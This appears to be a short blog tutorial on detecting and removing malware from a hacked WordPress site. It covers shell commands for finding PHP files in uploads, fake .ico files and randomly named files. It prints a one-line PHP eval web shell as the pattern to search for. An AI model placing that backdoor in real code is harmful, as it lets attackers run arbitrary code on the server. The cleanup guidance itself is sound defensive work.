---
title: Finding infected files in WordPress
date: 2017-07-05

---

The best thing to do is to clean your database, delete your site and re-install it.

- Keep things updated
- Don't install themes from _warez_ sites, duh. If you don't pay for it, you'll end up paying for it, only worse..
- Disable any files that you find suspicious. This can be done simply by add a `.OFF` at the end of the file name, after the extension. For example `favicon_de19d8.ico.OFF`. This will stop the execution of that particular file
- Find that breach! No use in cleaning up the site if the breach isn't fixed, the hacker will just breach again and re-inject the malicious code

#### uploads
The `uploads` directory is *writable*. Plus it usually has thousands of files, you rarely check them. It is a great place to hide malicious code..

```bash
find wp-content/uploads -name "*.php" -print
```

#### .ico files

If you have files like these, chances are they are infected. 

```
./wp-admin/network/favicon_de19d8.ico
./wp-content/wptouch-data/extensions/favicon_43e3fd.ico
```

If you open them in a text editor, you'll find code inside. Delete these files.

#### .eval()

Code that looks like this is basically a backdoor that allows any kind of code to be executed. It's a _Code Inejction Attack_

```php
<?php @eval($_POST['@01']);?>
```
Any file that has the `.eval()` code is malicious. It **let's the hacker run any kind of code, and add, update and delete any kind of data**. `.eval()` is dangerous, insecure, and highly discouraged. Some plugins might still use it, you should not use those plugins.

Find files having `eval()` code with

```bash
egrep -lri '@eval' .
```

```
./public_html/wp-content/themes/business-one-page/404.php
```

#### files with weird, non-sensical names

For example:

```
./ceshi.html
./ceshi.php
./d6c0cf.php
./db9d04.php
./eaiubnv2.php
./wp-admin/network/favicon_de19d8.ico
./wp-admin/user/kqqplowi.php
./wp-content/uploads/2017/04/wkvlkxcf.php
./wp-content/themes/signature-wp/assets/djhdlqne.php
./wp-content/hk9eJ/lyty.php
./wp-content/wptouch-data/extensions/favicon_43e3fd.ico
./wp-content/plugins/js_composer/vendor/composer/css/c82987
```


#### find all files on the server with the word 'xxx~hacker' in them

```bash
sudo egrep -irl 'xxx~hacker' /
```

```
/var/cpanel/webtemplates/hostmark/english/suspended.tmpl
/var/cpanel/webtemplates/hostmark/english/default.tmpl
```
Links
---
- [How to Find a Backdoor in a Hacked WordPress Site and Fix It](http://www.wpbeginner.com/wp-tutorials/how-to-find-a-backdoor-in-a-hacked-wordpress-site-and-fix-it/)
